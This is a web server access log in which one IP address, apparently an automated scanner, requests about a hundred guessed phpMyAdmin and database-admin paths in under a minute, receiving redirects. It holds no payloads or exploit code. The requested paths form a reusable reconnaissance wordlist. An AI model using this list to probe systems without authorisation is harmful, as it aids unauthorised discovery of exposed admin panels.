193.252.188.96 - - [09/Dec/2021:18:53:31 +0000] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:31 +0000] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:32 +0000] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:32 +0000] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:33 +0000] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:34 +0000] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:34 +0000] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:34 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:35 +0000] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:35 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:37 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:37 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:38 +0000] "GET /PMA2014/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:38 +0000] "GET /PMA/index.php?lang=en HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:39 +0000] "GET /phpMyAdmin-5.1.1-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:39 +0000] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:40 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:40 +0000] "GET /pma2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:40 +0000] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:41 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:41 +0000] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:42 +0000] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:42 +0000] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:43 +0000] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:43 +0000] "GET /pma2012/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:44 +0000] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:45 +0000] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:45 +0000] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:47 +0000] "GET /pma2012/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:47 +0000] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:47 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:48 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:49 +0000] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:49 +0000] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:50 +0000] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:50 +0000] "GET /pma2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:51 +0000] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:51 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:52 +0000] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:52 +0000] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:53 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:53 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:54 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:54 +0000] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:55 +0000] "GET /PMA2017/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:55 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:56 +0000] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:56 +0000] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:56 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:57 +0000] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:57 +0000] "GET /db/index.php?lang=en HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:57 +0000] "GET /phpMyAdmin-5.1.1-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:58 +0000] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:58 +0000] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:59 +0000] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:53:59 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:00 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:00 +0000] "GET /pma2013/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:01 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:01 +0000] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:02 +0000] "GET /mysql/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:02 +0000] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:03 +0000] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:03 +0000] "GET /PMA2015/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:04 +0000] "GET /pma2015/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:04 +0000] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:05 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:05 +0000] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:06 +0000] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:06 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:06 +0000] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:06 +0000] "GET /pma2015/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:07 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:07 +0000] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:08 +0000] "GET /pma2012/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:08 +0000] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:09 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:09 +0000] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:10 +0000] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:10 +0000] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:10 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:11 +0000] "GET /mysql/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:11 +0000] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:12 +0000] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:12 +0000] "GET /pma2018/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:13 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:13 +0000] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:14 +0000] "GET /pma2015/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:14 +0000] "GET /db/index.php?lang=en HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:15 +0000] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:15 +0000] "GET /pma2013/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:16 +0000] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:16 +0000] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:16 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:16 +0000] "GET /database/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:16 +0000] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:16 +0000] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:16 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:17 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:17 +0000] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:17 +0000] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:18 +0000] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:18 +0000] "-" 408 - "-" "-"
193.252.188.96 - - [09/Dec/2021:18:54:18 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:19 +0000] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
